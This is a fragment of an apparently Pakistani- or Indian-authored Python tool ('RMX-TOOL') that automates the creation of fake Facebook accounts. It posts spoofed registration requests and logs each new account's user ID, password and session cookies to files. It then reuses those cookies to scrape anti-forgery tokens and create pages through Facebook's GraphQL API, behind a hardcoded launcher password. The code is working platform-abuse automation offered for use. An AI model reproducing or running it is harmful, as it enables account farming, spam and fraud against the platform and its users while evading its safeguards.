            '__dyn': "1ZaaAG1mxu1oz-l0BBBzEnxG6U4a2i5U4e0C8dEc8uwcC4o2fwcW4o3Bw4Ewk9E4W0pKq0FE6S0x81vohw5Owk8aE36wqEd8dE2YwbK0iC1qw8W0k-0jG3qaw4kwbS1Lw9C0le0ue0QU",
            '__csr': "",
            '__req': "p",
            '__fmt': "1",
            '__a': "AYkiA9jnQluJEy73F8jWiQ3NTzmH7L6RFbnJ_SMT_duZcpo2yLDpuVXfU2doLhZ-H1lSX6ucxsegViw9lLO6uRx31-SpnBlUEDawD_8U7AY4kQ",
            '__user': "0"
        }
        header1 = {
            "Host":"m.facebook.com",
            "Connection":"keep-alive",
            "Upgrade-Insecure-Requests":"1",
            "User-Agent":windows(),
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "dnt":"1",
            "X-Requested-With":"mark.via.gp",
            "Sec-Fetch-Site":"none",
            "Sec-Fetch-Mode":"navigate",
            "Sec-Fetch-User":"?1",
            "Sec-Fetch-Dest":"document",
            "dpr":"1.75",
            "viewport-width":"980",
            "sec-ch-ua":"\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
            "sec-ch-ua-mobile":"?1",
            "sec-ch-ua-platform":"\"Android\"",
            "sec-ch-ua-platform-version":"\"\"",
            "sec-ch-ua-model":"\"\"",
            "sec-ch-ua-full-version-list":"",
            "sec-ch-prefers-color-scheme":"dark",
            "Accept-Encoding":"gzip, deflate, br, zstd",
            "Accept-Language":"en-GB,en-US;q=0.9,en;q=0.8"
        }
        reg_url = "https://www.facebook.com/reg/submit/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM0NDE0OTk2LCJjYWxsc2l0ZV9pZCI6OTA3OTI0NDAyOTQ4MDU4fQ%3D%3D&multi_step_form=1&skip_suma=0&shouldForceMTouch=1"
        try:
            py_submit = ses.post(reg_url, data = payload, headers = header1, timeout=25)
        except Exception:
            continue
        if py_submit is not None and 'c_user' in py_submit.cookies:
            first_cok = ses.cookies.get_dict()
            uid = str(first_cok["c_user"])
            cookie = (";").join([ "%s=%s" % (key,value) for key,value in ses.cookies.get_dict().items()])
            print('\r\r\x1b[38;5;46m[RMX-ALIVE] '+uid+' | '+passw+'\033[1;97m')
            print('\r\r\x1b[38;5;46m[COOKIE] : '+cookie)
            open('/sdcard/RMX-TOOL/AUTO/RMX-M1-OK.txt','a').write(uid+'|'+passw+'\n')
            open('/sdcard/RMX-TOOL/AUTO/RMX-M1-COOKIE.txt','a').write(uid+'|'+passw+'|'+cookie+'\n')
            oks.append(uid)
        else:
            cps.append(uid)
#▬▭▬▭▬▭▬▭[CREATE PAGE METHOD]▬▭▬▭▬▭▬▭#
class reg_pro5():
    def __init__(self,cookies,name) -> None:
        self.cookies = cookies
        self.name = name
        self.id_acc = self.cookies.split('c_user=')[1].split(';')[0]
        headers = {
            'authority': 'www.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'vi',
            'cookie': self.cookies,
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': windows,
            'viewport-width': '980',
        }
        url_profile = requests.get('https://www.facebook.com/me', headers=headers).url
        profile = requests.get(url_profile, headers=headers).text
        try:
            self.fb_dtsg = profile.split('{"name":"fb_dtsg","value":"')[1].split('"},')[0]
        except:
            self.fb_dtsg = profile.split(',"f":"')[1].split('","l":null}')[0]
    def Reg(self):
        headers = {
            'authority': 'www.facebook.com',
            'accept': '*/*',
            'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
            'cookie': self.cookies,
            'origin': 'https://www.facebook.com',
            'referer': 'https://www.facebook.com/pages/creation?ref_type=launch_point',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '""',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': ua,
            'viewport-width': '980',
            'x-fb-friendly-name': 'AdditionalProfilePlusCreationMutation',
            'x-fb-lsd': 'ZM7FAk6cuRcUp3imwqvHTY',
        }
        data = {
            'av': self.id_acc,
            '__user': self.id_acc,
            '__a': '1',
            '__dyn': '7AzHxq1mxu1syUbFuC0BVU98nwgU29zEdEc8co5S3O2S7o11Ue8hw6vwb-q7oc81xoswIwuo886C11xmfz81sbzoaEnxO0Bo7O2l2Utwwwi831wiEjwZwlo5qfK6E7e58jwGzE8FU5e7oqBwJK2W5olwuEjUlDw-wUws9ovUaU3qxWm2Sq2-azo2NwkQ0z8c84K2e3u362-2B0oobo',
            '__csr': 'gP4ZAN2d-hbbRmLObkZO8LvRcXWVvth9d9GGXKSiLCqqr9qEzGTozAXiCgyBhbHrRG8VkQm8GFAfy94bJ7xeufz8jK8yGVVEgx-7oiwxypqCwgF88rzKV8y2O4ocUak4UpDxu3x1K4opAUrwGx63J0Lw-wa90eG18wkE7y14w4hw6Bw2-o069W00CSE0PW06aU02Z3wjU6i0btw3TE1wE5u',
            '__req': 't',
            '__hs': '19296.HYP:comet_pkg.2.1.0.2.1',
            'dpr': '1',
            '__ccg': 'EXCELLENT',
            '__rev': '1006496476',
            '__s': '1gapab:y4xv3f:2hb4os',
            '__hsi': '7160573037096492689',
            '__comet_req': '15',
            'fb_dtsg': self.fb_dtsg,
            'jazoest': '25404',
            'lsd': 'ZM7FAk6cuRcUp3imwqvHTY',
            '__aaid': '800444344545377',
            '__spin_r': '1006496476',
            '__spin_b': 'trunk',
            '__spin_t': '1667200829',
            'fb_api_caller_class': 'RelayModern',
            'fb_api_req_friendly_name': 'AdditionalProfilePlusCreationMutation',
            'variables': '{"input":{"bio":"","categories":["181475575221097"],"creation_source":"comet","name":"'+self.name+'","page_referrer":"launch_point","actor_id":"'+self.id_acc+'","client_mutation_id":"1"}}',
            'server_timestamps': 'true',
            'doc_id': '5903223909690825',
        }
        response = requests.post('https://www.facebook.com/api/graphql/', headers=headers, data=data).json()
        try:
            return response['data']['additional_profile_plus_create']['additional_profile']['id']
        except:
            return (f'\x1b[1;31m FAILED TO CREATE PAGE.')
#▬▭▬▭▬▭▬▭[END]▬▭▬▭▬▭▬▭#
fucker()
def fucker():
    clear()
    rmx_logo()  # Yeh login screen par logo dikhayega
    
    user_token = connection_token()
    print(f"\033[1;33m[\033[38;5;214m•\033[1;33m] YOUR TOKEN : \033[1;97m{user_token}")
    print("\033[1;33m----------------------------------------------------------")
    
    fuckingPass = input('\033[1;33m[\033[38;5;214m•\033[1;33m] Enter Password : \033[1;97m')
    
    if fuckingPass == '0':
        sys.exit()
        
    elif fuckingPass == "jani":
        clear()  # Sahi password par yeh purane logo ko screen se saaf kar dega
        rmx_main()  # Phir main menu chalega aur sirf EK baar logo show hoga
        
    else:
        print("\033[1;91m[-] Your Password is Wrong !!")
        sys.exit()

